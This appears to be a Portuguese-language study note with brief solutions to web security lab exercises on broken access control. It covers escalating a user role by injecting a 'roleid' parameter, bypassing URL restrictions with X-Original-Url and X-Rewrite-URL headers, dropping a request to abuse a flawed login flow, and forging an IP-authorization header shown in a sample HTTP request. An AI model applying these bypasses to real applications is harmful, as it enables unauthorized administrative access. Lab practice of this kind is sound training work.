# Vulnerabilidades de Controle de Acesso

Probabilidade: $${\color{yellow}média}$$.

<br>

## Laboratórios

**User Role can be Modified in User Profile**

Observe o parâmetro `"roleid":"1"` na resposta da requisição de trocar e-mail.

Adicione esse parâmetro na request com o valor 2: `"roleid":"2"` e tenha seus privilégios escalados.

Se o valor dois não funcionar, use o Intruder de 0 a 100 para descobrir o valor da role de administrator.

<br>
<br>

**URL-based Access Control Can Be Circumvented**
```
X-Original-Url: /admin
X-Rewrite-URL: /admin
```

<br>
<br>

**Authentication Bypass via Flawed State Machine**

Drope a request que está configurando a role.

<br>
<br>

**Authentication Bypass via Information Disclosure**

Use o método `TRACE` para encontrar o header escondido.

```
GET /admin HTTP/2
Host: TARGET.net
X-Custom-Ip-Authorization: 127.0.0.1
Cookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm
```
